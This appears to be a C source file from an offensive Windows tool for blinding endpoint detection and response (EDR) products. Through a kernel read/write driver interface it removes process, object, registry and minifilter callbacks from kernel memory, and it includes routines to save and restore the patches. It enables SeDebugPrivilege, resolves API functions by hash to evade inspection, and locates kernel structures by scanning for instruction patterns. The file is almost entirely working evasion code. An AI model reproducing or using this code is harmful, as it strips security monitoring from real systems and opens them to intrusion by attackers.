#include "Common.h"
#include "Structs.h"
#include "FunctionPointers.h"

#include <stdio.h>



char* ci_strstr(const char* str1, const char* str2) {
	// Handle empty pattern string case
	if (!*str2) return (char*)str1;

	// Iterate through each character in the main string as potential starting position
	for (const char* haystack = str1; *haystack; haystack++) {
		const char* h = haystack;
		const char* n = str2;

		// Compare from current position
		while (*h && *n &&
			tolower((unsigned char)*h) == tolower((unsigned char)*n)) {
			h++;
			n++;
		}

		// If pattern string is fully matched, return starting position
		if (!*n) return (char*)haystack;
	}

	return NULL;
}

VOID Memcpy(IN PVOID pDestination, IN PVOID pSource, SIZE_T sLength)
{
	PBYTE D = (PBYTE)pDestination;
	PBYTE S = (PBYTE)pSource;

	while (sLength--) {
		*D++ = *S++;
	}
}


BOOL saveMemoryFile() {
	HANDLE hFile = INVALID_HANDLE_VALUE;
	DWORD nNumberOfBytesToWrite = 0;
	PMemoryPatch ppt = GetContext()->PatchTable;

	// Create patch file
	hFile = CreateFileA(PATCH_FILE_NAME,
		GENERIC_WRITE,
		0,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (hFile == INVALID_HANDLE_VALUE) {
		PRINT("Failed to create patch file\n");
		return FALSE;
	}

	// Write each patch entry
	PMemoryPatch p = ppt;
	while (p) {
		// Write patch address
		if (!WriteFile(hFile, &p->pAddr, sizeof(PVOID), &nNumberOfBytesToWrite, NULL) ||
			nNumberOfBytesToWrite != sizeof(PVOID)) {
			CloseHandle(hFile);
			return FALSE;
		}

		// Write data size
		if (!WriteFile(hFile, &p->szData, sizeof(UINT64), &nNumberOfBytesToWrite, NULL) ||
			nNumberOfBytesToWrite != sizeof(UINT64)) {
			CloseHandle(hFile);
			return FALSE;
		}

		// Write patch data
		if (!WriteFile(hFile, p->pData, p->szData, &nNumberOfBytesToWrite, NULL) ||
			nNumberOfBytesToWrite != p->szData) {
			CloseHandle(hFile);
			return FALSE;
		}

		p = p->pNext;
	}

	CloseHandle(hFile);
	PRINT("Patch record saved\n");
	return TRUE;
}

BOOL restoreBlindness() {
	HANDLE hFile = INVALID_HANDLE_VALUE;
	DWORD bytesRead = 0;
	MemoryPatch pt = { 0 };
	PCHAR patchData = NULL;
	BOOL success = TRUE;

	// Open patch file
	hFile = CreateFileA(PATCH_FILE_NAME,
		GENERIC_READ,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (hFile == INVALID_HANDLE_VALUE) {
		PRINT("Failed to open patch file\n");
		return FALSE;
	}

	PRINT("Restored patch\n");
	// Read and apply patches
	while (TRUE) {
		// Read patch address
		if (!ReadFile(hFile, &pt.pAddr, sizeof(PVOID), &bytesRead, NULL) ||
			bytesRead != sizeof(PVOID)) {
			break;  // End of file or error
		}

		// Read data size
		if (!ReadFile(hFile, &pt.szData, sizeof(UINT64), &bytesRead, NULL) ||
			bytesRead != sizeof(UINT64)) {
			success = FALSE;
			break;
		}

		// Validate data size
		if (pt.szData == 0) {
			break;
		}

		// Allocate buffer for patch data
		patchData = (PCHAR)calloc(pt.szData, 1);
		if (!patchData) {
			PRINT("Memory allocation failed for patch data\n");
			success = FALSE;
			break;
		}

		// Read patch data
		if (!ReadFile(hFile, patchData, pt.szData, &bytesRead, NULL) ||
			bytesRead != pt.szData) {
			success = FALSE;
			break;
		}

		// Apply patch
		DriverMemoryOperation(patchData, pt.pAddr, pt.szData, MEMORY_WRITE);
		PRINT("\t 0x%p -> %llu bytes\n", pt.pAddr, pt.szData);

		// Cleanup current patch data
		free(patchData);
		patchData = NULL;
		ZeroMemory(&pt, sizeof(MemoryPatch));
	}

	// Final cleanup
	if (patchData) {
		free(patchData);
	}
	CloseHandle(hFile);

	if (success) {
		PRINT("All patches restored successfully\n");
	}
	else {
		PRINT("Error occurred while restoring patches\n");
	}

	return success;
}

BOOL BlindEdr() {

	// If it is Windows 11 24H2 version, 
	// SedebugPrivilege must be enabled to obtain the kernel's imagebase address
	if (!EnablePrivilegeH()) {
		PRINT("Failed to handle privileges\n");
		return FALSE;
	}

	static INT64 FltEnumerateFiltersAddr = 0;

	// Initialize filter manager
	FltEnumerateFiltersAddr = GetFuncAddressH(FLTMGRSYS_CH,  FltEnumerateFilters_CH);
	
	if (!FltEnumerateFiltersAddr) {
		PRINT("Failed to get FltEnumerateFilters address\n");
		return FALSE;
	}

	PRINT("Starting EDR kernel cleanup...\n");

	// Clear system callbacks
	BOOL success = TRUE;

	__try {
		ClearThreeCallBack();
		ClearObRegisterCallbacks();
		ClearCmRegistercallback();
		ClearMiniFilterCallBack(FltEnumerateFiltersAddr);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		PRINT("× Cleanup failed with exception: 0x%08x\n", GetExceptionCode());
		success = FALSE;
	}

	if (!success) {
		PRINT("Warning: Some callbacks could not be cleared\n");
	}

	// Save system state
	if (!saveMemoryFile()) {
		PRINT("Failed to save system state\n");
		return FALSE;
	}

	PRINT("EDR kernel completed successfully\n");
	return TRUE;
}

VOID DriverMemoryOperation(
	PVOID fromAddress,    // Source ptr
	PVOID toAddress,      // Target ptr
	size_t len,           // Length
	MEMORY_OPERATION opType)
{
	PBasic_INFO pbasic_info = GetContext();

	PMemOp req = NULL;
	DWORD bytesRet = 0;
	BOOL success = FALSE;

	HANDLE hDevice = GetContextHandle();
	PMemoryPatch ppt = GetPatchTable();

	// Backup kernel memory before write operations
	if (opType == MEMORY_WRITE && (UINT64)toAddress > 0xFFFF000000000000)
	{
		PMemOp bkreq = NULL;
		PMemoryPatch cpt = NULL;
		PCHAR pBackup = (PCHAR)calloc(len, 1);

		if (pBackup)
		{
			bkreq = (PMemOp)malloc(sizeof(MemOp));
			if (bkreq)
			{
				// Configure backup request
				bkreq->SourceAddress = toAddress;
				bkreq->Size = len;
				bkreq->DestinationAddress = pBackup;

				success = DeviceIoControl(hDevice, RW_MEM_CODE, bkreq,
					sizeof(MemOp), bkreq, sizeof(MemOp), &bytesRet, NULL);

				if (success)
				{
					// Update patch table
					cpt = (PMemoryPatch)malloc(sizeof(MemoryPatch));
					if (cpt)
					{
						cpt->pAddr = toAddress;
						cpt->szData = len;
						cpt->pData = pBackup;
						cpt->pNext = pbasic_info->PatchTable;
						pbasic_info->PatchTable = cpt;
					}
				}
				free(bkreq);
			}
			else {
				free(pBackup);
			}
		}
	}

	// Execute memory operation
	req = (PMemOp)malloc(sizeof(MemOp));
	if (req)
	{
		req->SourceAddress = fromAddress;
		req->Size = len;
		req->DestinationAddress = toAddress;

		success = DeviceIoControl(hDevice, RW_MEM_CODE, req,
			sizeof(MemOp), req, sizeof(MemOp), &bytesRet, NULL);

		if (!success) {
			CloseHandle(hDevice);
		}
		free(req);
	}
}

PVOID GetModuleBaseH(IN UINT32 NAME_HASH)
{
	// Simple static cache with last lookup
	static UINT32 lastHash = 0;
	static PVOID lastBase = NULL;

	// Check cache first
	if (lastHash == NAME_HASH && lastBase) {
		return lastBase;
	}

	PRTL_PROCESS_MODULES ModuleInfo = NULL;
	PVOID result = NULL;

	// Allocate buffer for module info
	ModuleInfo = (PRTL_PROCESS_MODULES)calloc(1024 * 1024, 1);
	if (!ModuleInfo) {
		return NULL;
	}

	__try {
		// Query system modules
		if (NT_SUCCESS(NtQuerySystemInformation(
			SystemModuleInformation,
			ModuleInfo,
			1024 * 1024,
			NULL)))
		{
			// Find target module
			for (ULONG i = 0; i < ModuleInfo->NumberOfModules; i++)
			{
				PCHAR moduleName = (PCHAR)(ModuleInfo->Modules[i].FullPathName +
					ModuleInfo->Modules[i].OffsetToFileName);

				if (NAME_HASH == CHASH(moduleName)) {
					result = ModuleInfo->Modules[i].ImageBase;
					PRINT("Module: %s, Base Address: 0x%llx\n", moduleName, (UINT64)result);
					// Update cache
					lastHash = NAME_HASH;
					lastBase = result;
					break;
				}
			}
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		result = NULL;
	}

	free(ModuleInfo);
	return result;
}

BOOL EnablePrivilegeH()
{
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES tp = { 0 };
	LUID luid = { 0 };
	BOOL bResult = FALSE;

	// Only enable privilege elevation for Windows 11 24H2 (Build 26100)
	DWORD buildNumber = GetNtBuild();
	if (buildNumber != 26100) {
		PRINT("Current build number: %d, privilege elevation not required\n", buildNumber);
		return TRUE;
	}

	// Get required API functions from advapi32.dll
	HMODULE hAdvapi32 = GetModuleHandleH(advapi32dll_CH, FALSE);
	if (!hAdvapi32) {
		PRINT("Failed to get advapi32.dll handle\n");
		return FALSE;
	}

	// Resolve function addresses using API hashing
	fnOpenProcessToken pOpenProcessToken = 
		(fnOpenProcessToken)GetProcAddressH(hAdvapi32, OpenProcessToken_CH);
	fnLookupPrivilegeValueA pLookupPrivilegeValue = 
		(fnLookupPrivilegeValueA)GetProcAddressH(hAdvapi32, LookupPrivilegeValueA_CH);
	fnAdjustTokenPrivileges pAdjustTokenPrivileges = 
		(fnAdjustTokenPrivileges)GetProcAddressH(hAdvapi32, AdjustTokenPrivileges_CH);

	if (!pOpenProcessToken || !pLookupPrivilegeValue || !pAdjustTokenPrivileges) {
		PRINT("Failed to get required function addresses\n");
		return FALSE;
	}

	__try {
		// Open process token with required access rights
		if (!pOpenProcessToken(GetCurrentProcess(), 
			TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, 
			&hToken)) 
		{
			PRINT("OpenProcessToken failed with %d\n", GetLastError());
			__leave;
		}

		// Use the complete privilege name
		const char* privName = "SeDebugPrivilege";  // Full privilege name
		
		// Get LUID for SeDebugPrivilege
		if (!pLookupPrivilegeValue(NULL, privName, &luid)) 
		{
			PRINT("LookupPrivilegeValue failed with %d\n", GetLastError());
			__leave;
		}

		// Setup privilege array
		tp.PrivilegeCount = 1;
		tp.Privileges[0].Luid = luid;
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		// Adjust token privileges to enable SeDebugPrivilege
		if (!pAdjustTokenPrivileges(hToken, 
			FALSE,              
			&tp,               
			sizeof(TOKEN_PRIVILEGES), 
			NULL,              
			NULL))
		{
			PRINT("AdjustTokenPrivileges failed with %d\n", GetLastError());
			__leave;
		}

		// Check if the privilege was actually assigned
		if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
			PRINT("The token does not have the specified privilege\n");
			__leave;
		}

		bResult = TRUE;
		PRINT("Successfully enabled SeDebugPrivilege\n");
	}
	__except(EXCEPTION_EXECUTE_HANDLER) {
		PRINT("Exception occurred while enabling privilege: 0x%08x\n", GetExceptionCode());
		bResult = FALSE;
	}

	// Cleanup
	if (hToken) {
		CloseHandle(hToken);
	}

	return bResult;
}


UINT64 GetFuncAddressH(IN UINT32 ModuleNameHash, IN UINT32 FuncNameHash)
{
    // Get kernel module base
    PVOID KBase = GetModuleBaseH(ModuleNameHash);
    if (!KBase) {
		PRINT("Can't get the ModuleBase!\n");
        return 0;
    }

    // Get user-mode module handle
    HMODULE hModule = NULL;
    HMODULE hKernel32 = GetModuleHandleH(kernel32dll_CH, FALSE);
    if (!hKernel32) {
        return 0;
    }

    // Load appropriate module
    if (ModuleNameHash == FLTMGRSYS_CH) {
        fnLoadLibraryExA pLoadLibraryEx = (fnLoadLibraryExA)GetProcAddressH(hKernel32, LoadLibraryExA_CH);
        if (pLoadLibraryEx) {
            hModule = pLoadLibraryEx("C:\\windows\\system32\\drivers\\FLTMGR.SYS", 
                                   NULL, DONT_RESOLVE_DLL_REFERENCES);
        }
    } else if(ModuleNameHash == NTOSKRNLEXE_CH){
        fnLoadLibraryA pLoadLibrary = (fnLoadLibraryA)GetProcAddressH(hKernel32, LoadLibraryA_CH);
        if (pLoadLibrary) {
            hModule = pLoadLibrary("ntoskrnl.exe");
        }
    }

    if (!hModule) {
        return 0;
    }

    // Get and calculate final function address
    VOID* ProcAddr = GetProcAddressH(hModule, FuncNameHash);
    return ProcAddr ? ((UINT64)KBase + ((UINT64)ProcAddr - (UINT64)hModule)) : 0;
}


UINT64 CalculateOffset(UINT64 address, int startOffset, int count) {
	BYTE* buffer = (BYTE*)malloc(1);
	UINT64 offset = 0;

	for (int i = count, k = 24; i > startOffset; i--, k -= 8) {
		DriverMemoryOperation((VOID*)(address + i), buffer, 1, MEMORY_WRITE);
		offset = ((UINT64)*buffer << k) + offset;
	}

	if ((offset & SIGN_EXTENSION_MASK) == SIGN_EXTENSION_MASK) {
		offset |= FULL_EXTENSION_MASK;
	}

	return offset;
}

BOOLEAN ValidateLeaPattern(const BYTE* data) {
	if ((data[0] == 0x4C && data[1] == 0x8D) || (data[0] == 0x48 && data[1] == 0x8D)) {
		if ((data[2] == 0x0D) || (data[2] == 0x15) || (data[2] == 0x1D) ||
			(data[2] == 0x25) || (data[2] == 0x2D) || (data[2] == 0x35) ||
			(data[2] == 0x3D)) {
			return TRUE;
		}
	}
	else {
		return FALSE;
	}
}

BOOLEAN ValidateCallJmpPattern(const BYTE* data) {
	return (data[0] == 0xE8 || data[0] == 0xE9);
}


// Search for instruction pattern '48 8D 05'
// LEA RAX, [RIP + displacement] 
BOOLEAN ValidateLeaRipPattern(const BYTE* data) {
	// Check REX.W prefix (48)
	if (data[0] != 0x48) return FALSE;

	// Check LEA opcode (8D)
	if (data[1] != 0x8D) return FALSE;

	// Check ModR/M byte for RIP-relative addressing (05)
	if (data[2] != 0x05) return FALSE;

	return TRUE;
}

BOOLEAN ValidateMovPattern(const BYTE* data) {
	// Check REX.W prefix (48)
	if (data[0] != 0x4C) return FALSE;

	// Check LEA opcode (8D)
	if (data[1] != 0x8B) return FALSE;

	// Check ModR/M byte for RIP-relative addressing (05)
	if (data[2] != 0x05) return FALSE;

	return TRUE;
}

BOOLEAN ValidateCmUnRegisterPattern(const BYTE* data) {
	// return (data[0] == 0x48 && data[1] == 0x8D && data[2] == 0x54) && (data[5] == 0x48 && data[6] == 0x8D && data[7] == 0x0D);
	// TODO-shoule be modified.
	return (data[0] == 0x48 && data[1] == 0x8D && data[2] == 0x0D);
}

// Find pattern in memory
UINT64 FindPattern(UINT64 startAddress, const PATTERN_SEARCH* pattern, int maxCount) {
	if (!pattern || pattern->length == 0) {
		return 0;
	}

	BYTE* buffer = (BYTE*)malloc(pattern->length);
	if (!buffer) {
		return 0;
	}

	int count = 0;
	UINT64 currentAddr = startAddress;

	while (count++ < maxCount) {
		// Read memory at current address
		DriverMemoryOperation((VOID*)currentAddr, buffer, pattern->length, MEMORY_WRITE);

		if (pattern->validate) {
			if (pattern->validate(buffer)) {
				free(buffer);
				return currentAddr;
			}
		}
		
		currentAddr++;
	}

	free(buffer);
	return 0;
}

